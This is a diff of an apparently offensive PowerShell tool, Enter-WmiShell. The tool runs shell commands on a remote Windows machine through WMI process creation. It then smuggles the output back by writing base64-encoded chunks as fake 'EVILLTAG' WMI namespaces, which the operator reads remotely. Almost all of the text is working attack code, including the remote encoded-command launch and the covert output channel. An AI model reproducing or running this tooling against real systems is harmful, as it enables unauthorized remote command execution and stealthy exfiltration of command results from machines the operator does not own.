@@ -38,8 +38,8 @@ Author : Jesse "RBOT" Davis
 		[string]$Encoding
 	) #End Param
 	
-	$getOutput = @()
-	$getOutput = Get-WmiObject -Credential $UserName -ComputerName $ComputerName -Namespace root\default -Query "SELECT Name FROM __Namespace WHERE Name like 'EVILLTAG%'" | Select-Object Name
+	$getOutput = @() #-Credential $UserName 
+	$getOutput = Get-WmiObject -ComputerName $ComputerName -Namespace root\default -Query "SELECT Name FROM __Namespace WHERE Name like 'EVILLTAG%'" | Select-Object Name
 	
 	if ([BOOL]$getOutput.Length) {
 		
@@ -51,14 +51,10 @@ Author : Jesse "RBOT" Davis
 			foreach ($line in $sortStrings) {
 	
 				#Replace non-base64 characters
-				$cleanString = $line.Remove(0, 14) -replace "`"", "+" -replace "Ã", "" -replace "_", "/"
-				
-				#Add necessary base64 padding character
-				if ($cleanString.Length % 3 -eq 0) { $base64Pad = $cleanString }
-				else { $base64Pad = $cleanString + ("=" * (3 - ($cleanString.Length % 3))) }
+				$cleanString = $line.Remove(0, 14) -replace 'Ã', '\+' -replace '_', '/'
 				
 				# Decode base64 padded string and remove front side spaces
-				$decodeString = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($base64Pad)).Remove(0, 8))
+				$decodeString = ([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($cleanString + '=')).Remove(0, 8))
 				
 				# Remove back side spaces and append output
 				$decodedOutput += $decodeString.Remove(($decodeString.Length - 8), 8)
@@ -69,12 +65,12 @@ Author : Jesse "RBOT" Davis
 	else {
         #Decode single line Base64
 		$getStrings = $getOutput.Name
-		$cleanString = $getStrings.Remove(0, 14) -replace "`"", "+" -replace "Ã", "" -replace "_", "/"
-		Try { $decodedOutput = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($cleanString)) }
+		$cleanString = $getStrings.Remove(0, 14) -replace "`"", "+" -replace "Ãƒ", "" -replace "_", "/"
+		Try { $decodedOutput = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($cleanString)) }
 		Catch [System.Management.Automation.MethodInvocationException] {
-			Try { $decodedOutput = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($cleanString + "=")) }
+			Try { $decodedOutput = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($cleanString + "=")) }
 			Catch [System.Management.Automation.MethodInvocationException] {
-			    $decodedOutput = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($cleanString + "==")) }
+			    $decodedOutput = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($cleanString + "==")) }
 			Finally {}
 		}
 		Finally { Write-Host $decodedOutput.Remove(0, 8) }    
@@ -291,36 +287,41 @@ function Enter-WmiShell{
                     -Query "SELECT * FROM __Namespace WHERE Name LIKE 'EVILLTAG%' OR Name LIKE 'OUTPUT_READY'" | Remove-WmiObject
                 }
                 default { 
-                    $encPosh = Out-EncodedCommand -NoProfile -NonInteractive -ScriptBlock {
-                        function Insert-Piece($number, $piece) {
-                            $count = $number.ToString()
-	                        $zeros = "0" * (6 - $count.Length)
-	                        $tag = "EVILLTAG" + $zeros + $count
-	                        $piece = [System.Convert]::ToBase64String([System.Text.Encoding]::UNICODE.GetBytes($piece))
-	                        $piece = $tag + $piece -replace "+","Ó" -replace "/","_"
-	                        $aShell = New-Object -c WScript.Shell
-	                        $aShell.Exec("wmic.exe /NAMESPACE:\\root\default PATH __Namespace CREATE Name='" + $($piece) + "'")
+                    $remoteScript = @"
+                    `$wshell = New-Object -c WScript.Shell
+                    function Insert-Piece(`$i, `$piece) {
+                            `$count = `$i.ToString()
+	                        `$zeros = "0" * (6 - `$count.Length)
+	                        `$tag = "EVILLTAG" + `$zeros + `$count
+	                        `$piece = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes(`$piece))
+	                        `$piece = `$tag + `$piece -replace '\+','Ã' -replace '/','_' -replace '=',''
+	                        `$null = `$wshell.Exec("wmic.exe /NAMESPACE:\\root\default PATH __Namespace CREATE Name='" + `$piece + "'")
                             Start-Sleep -m 50
                         }
-                        $wshell = New-Object -c WScript.Shell
-                        $wshell.Exec("wmic.exe /NAMESPACE:\\root\default PATH __Namespace where ""Name like 'OUTPUT_READY'"" delete")
-	                    $wshell.Exec("wmic.exe /NAMESPACE:\\root\default PATH __Namespace where ""Name like '%EVILLTAG%'"" delete")
-	                    $cmdExec = $wshell.Exec("%comspec% /c " + $($command)) 
-	                    $cmdOut = $cmdExec.StdOut.ReadAll()
-	                    $nbr = [int]($cmdOut.Length/5500)
-                        foreach($obj in $nbr) {
-                            $i++
-	                        $piece = $cmdOut.Substring(0,5500)
-		                    $piece = "        " + $piece + "        "
-		                    $cmdOut = $cmdOut.Substring(5500,($cmdOut.Length - 5500))
-		                    Insert-Piece $i $piece
+                        `$null = `$wshell.Exec("wmic.exe /NAMESPACE:\\root\default PATH __Namespace where ""Name LIKE 'OUTPUT_READY' OR Name like '%EVILLTAG%'"" delete")
+	                    `$cmdExec = `$wshell.Exec("%comspec% /c " + "$command") 
+	                    `$cmdOut = `$cmdExec.StdOut.ReadAll()
+	                    `$j = `$nbr = [Math]::Floor(`$cmdOut.Length/3000)
+                        while(`$j -gt 0) {
+                            `$i++
+	                        `$piece = `$cmdOut.Substring(0,3000)
+		                    `$piece = "        " + `$piece + "        "
+		                    `$cmdOut = `$cmdOut.Substring(3000,(`$cmdOut.Length - 3000))
+                            Write-Host `$piece.Length
+		                    Insert-Piece `$i `$piece
+                            `$j--
                         }
-	                    $cmdOut = "        " + $cmdOut + "        "
-	                    Insert-Piece ($nbOfPieces + 1) $cmdOut 
-	                    $myShell.Exec("wmic /NAMESPACE:\\root\default PATH __Namespace CREATE Name='OUTPUT_READY'")
-                    }
-                    $null = Invoke-WmiMethod -ComputerName $ComputerName -Credential $UserName -Class win32_process -Name create -ArgumentList $encPosh
+	                    `$cmdOut = "        " + `$cmdOut + "        "
+                        Write-Host `$cmdOut.Length
+	                    Insert-Piece (`$nbr + 1) `$cmdOut 
+	                    `$null = `$wShell.Exec("wmic.exe /NAMESPACE:\\root\default PATH __Namespace CREATE Name='OUTPUT_READY'")
+"@
+                    $scriptBlock = [scriptblock]::Create($remoteScript)
+                    $encPosh = Out-EncodedCommand -NoProfile -NonInteractive -NoExit -ScriptBlock $scriptBlock
+                    $null = Invoke-WmiMethod -Class win32_process -Name create -ArgumentList $encPosh
                     
+                    #-ComputerName $ComputerName -Credential $UserName
+
                     # Wait for vbScrpit to finish writing output to WMI namespaces
                     Start-Sleep -Seconds 1
                     $outputReady = ""
